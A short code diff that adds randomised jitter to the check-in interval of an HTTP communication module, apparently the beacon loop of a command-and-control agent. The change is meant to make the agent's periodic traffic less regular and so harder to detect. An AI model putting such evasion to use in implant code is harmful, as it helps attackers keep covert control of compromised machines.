@@ -1,5 +1,6 @@
 import base64
 import json
+import random
 import time
 import requests
 from Models.Task import Task
@@ -27,7 +28,8 @@ class HTTPCommunicationModule(CommunicationModule):
     def start(self):
         while self.running:
             self.checkin()
-            time.sleep(5)
+            jitter = random.uniform(-self.agent.jitter, self.agent.jitter)
+            time.sleep(max(0.0, self.agent.sleep_interval + jitter))
 
     def stop(self):
         self.running = False
